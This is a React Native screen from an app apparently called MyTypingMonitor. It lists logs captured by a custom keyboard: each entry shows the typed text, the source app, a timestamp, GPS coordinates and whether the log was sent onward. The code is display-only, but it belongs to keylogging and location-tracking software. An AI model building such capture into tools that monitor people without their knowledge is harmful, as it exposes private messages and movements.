import React, {useState, useEffect} from 'react';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  ActivityIndicator,
  RefreshControl,
  TouchableOpacity,
} from 'react-native';
import {NativeModules} from 'react-native';
import Logo from '../components/Logo';

const {TypingMonitor} = NativeModules;

// Helper to check if native module is available
const isNativeModuleAvailable = (): boolean => {
  try {
    return !!(
      TypingMonitor &&
      typeof TypingMonitor.getLogs === 'function' &&
      typeof TypingMonitor.sendLogs === 'function'
    );
  } catch (e) {
    return false;
  }
};

// Fallback for when native module is not available
const TypingMonitorFallback = {
  getLogs: async () => [],
  getStats: async () => ({
    totalChars: 0,
    totalLogs: 0,
    charsPerMinute: 0,
    mostUsedApp: null,
    mostUsedAppCount: 0,
    uniqueLocations: 0,
    activeHours: {},
  }),
  sendLogs: async () => {
    return Promise.reject(new Error('DEVELOPMENT_BUILD_REQUIRED'));
  },
};

// Safely get the module with fallback
const getTypingMonitorModule = () => {
  try {
    return TypingMonitor && typeof TypingMonitor.getLogs === 'function' 
      ? TypingMonitor 
      : TypingMonitorFallback;
  } catch (e) {
    return TypingMonitorFallback;
  }
};

const TypingMonitorModule = getTypingMonitorModule();

interface TypingLog {
  id: string;
  text: string;
  appPackage: string;
  timestamp: number;
  latitude?: number;
  longitude?: number;
  isSent: boolean;
}

const Logs = ({navigation}: {navigation?: {navigate?: (screen: string) => void; goBack?: () => void}}) => {
  const [logs, setLogs] = useState<TypingLog[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);

  useEffect(() => {
    loadLogs();
  }, []);

  const loadLogs = async () => {
    try {
      setLoading(true);
      const module = getTypingMonitorModule();
      const logsData = await module.getLogs();
      setLogs(logsData || []);
    } catch (error) {
      console.error('Error loading logs:', error);
      setLogs([]);
      console.warn('TypingMonitor native module not available, using fallback');
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  const onRefresh = () => {
    setRefreshing(true);
    loadLogs();
  };

  const formatTimestamp = (timestamp: number) => {
    const date = new Date(timestamp);
    return date.toLocaleString();
  };

  const formatAppName = (packageName: string) => {
    const parts = packageName.split('.');
    return parts[parts.length - 1] || packageName;
  };

  if (loading) {
    return (
      <View style={styles.centerContainer}>
        <ActivityIndicator size="large" color="#6200ee" />
        <Text style={styles.loadingText}>Loading logs...</Text>
      </View>
    );
  }

  return (
    <View style={styles.container}>
      <View style={styles.header}>
        <View style={styles.headerTop}>
          <TouchableOpacity
            style={styles.backButton}
            onPress={() => navigation?.goBack?.() || navigation?.navigate?.('Dashboard')}>
            <Text style={styles.backButtonText}>← Back</Text>
          </TouchableOpacity>
        </View>
        <View style={styles.titleContainer}>
          <Logo size="small" showText={false} />
          <View style={styles.titleWrapper}>
            <Text style={styles.title}>Typing Logs</Text>
            <View style={styles.titleUnderline} />
          </View>
        </View>
        <View style={styles.countBadge}>
          <Text style={styles.countText}>{logs.length} entries</Text>
        </View>
      </View>
      <FlatList
        data={logs}
        keyExtractor={item => item.id}
        renderItem={({item}) => (
          <View style={styles.logItem}>
            <View style={styles.logHeader}>
              <Text style={styles.logText}>{item.text}</Text>
            </View>
            <View style={styles.logMeta}>
              <Text style={styles.metaText}>
                {formatAppName(item.appPackage)}
              </Text>
              <Text style={styles.metaText}>
                {formatTimestamp(item.timestamp)}
              </Text>
            </View>
            {item.latitude && item.longitude && (
              <Text style={styles.locationText}>
                📍 {item.latitude.toFixed(4)}, {item.longitude.toFixed(4)}
              </Text>
            )}
            {item.isSent && (
              <Text style={styles.sentBadge}>✓ Sent</Text>
            )}
          </View>
        )}
        refreshControl={
          <RefreshControl refreshing={refreshing} onRefresh={onRefresh} />
        }
        ListEmptyComponent={
          <View style={styles.emptyContainer}>
            <Text style={styles.emptyText}>No logs yet</Text>
            <Text style={styles.emptySubtext}>
              Start typing with the MyTypingMonitor keyboard to see logs here
            </Text>
          </View>
        }
      />
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f5f5f5',
  },
  centerContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#f5f5f5',
  },
  loadingText: {
    marginTop: 16,
    fontSize: 16,
    color: '#666',
  },
  header: {
    backgroundColor: '#6200ee',
    padding: 20,
    paddingTop: 56,
    paddingBottom: 24,
    borderBottomLeftRadius: 24,
    borderBottomRightRadius: 24,
    shadowColor: '#000',
    shadowOffset: {width: 0, height: 4},
    shadowOpacity: 0.3,
    shadowRadius: 8,
    elevation: 8,
  },
  headerTop: {
    flexDirection: 'row',
    marginBottom: 16,
  },
  backButton: {
    paddingVertical: 10,
    paddingHorizontal: 16,
    borderRadius: 12,
    backgroundColor: 'rgba(255, 255, 255, 0.2)',
    alignSelf: 'flex-start',
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.3)',
    shadowColor: '#000',
    shadowOffset: {width: 0, height: 2},
    shadowOpacity: 0.2,
    shadowRadius: 3,
    elevation: 3,
  },
  backButtonText: {
    color: '#fff',
    fontSize: 15,
    fontWeight: '700',
    letterSpacing: 0.5,
  },
  titleContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 12,
  },
  icon: {
    fontSize: 32,
    marginRight: 12,
  },
  titleWrapper: {
    flex: 1,
  },
  title: {
    fontSize: 28,
    fontWeight: '800',
    color: '#fff',
    letterSpacing: 0.5,
    textShadowColor: 'rgba(0, 0, 0, 0.3)',
    textShadowOffset: {width: 0, height: 2},
    textShadowRadius: 4,
  },
  titleUnderline: {
    width: 50,
    height: 3,
    backgroundColor: '#fff',
    borderRadius: 2,
    marginTop: 6,
    opacity: 0.9,
  },
  countBadge: {
    marginTop: 8,
    paddingVertical: 8,
    paddingHorizontal: 16,
    backgroundColor: 'rgba(255, 255, 255, 0.2)',
    borderRadius: 20,
    alignSelf: 'flex-start',
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.3)',
  },
  countText: {
    color: '#fff',
    fontSize: 14,
    fontWeight: '600',
    letterSpacing: 0.3,
  },
  logItem: {
    backgroundColor: '#fff',
    padding: 18,
    marginHorizontal: 16,
    marginVertical: 10,
    borderRadius: 12,
    borderLeftWidth: 4,
    borderLeftColor: '#6200ee',
    shadowColor: '#000',
    shadowOffset: {width: 0, height: 2},
    shadowOpacity: 0.08,
    shadowRadius: 4,
    elevation: 2,
    borderWidth: 1,
    borderColor: '#f0f0f0',
  },
  logHeader: {
    marginBottom: 8,
  },
  logText: {
    fontSize: 16,
    color: '#333',
    fontWeight: '500',
    lineHeight: 22,
  },
  logMeta: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    marginTop: 8,
  },
  metaText: {
    fontSize: 12,
    color: '#666',
  },
  locationText: {
    fontSize: 12,
    color: '#999',
    marginTop: 4,
  },
  sentBadge: {
    fontSize: 12,
    color: '#4caf50',
    marginTop: 4,
    fontWeight: '600',
  },
  emptyContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 32,
  },
  emptyText: {
    fontSize: 18,
    fontWeight: '600',
    color: '#666',
    marginBottom: 8,
  },
  emptySubtext: {
    fontSize: 14,
    color: '#999',
    textAlign: 'center',
  },
});

export default Logs;


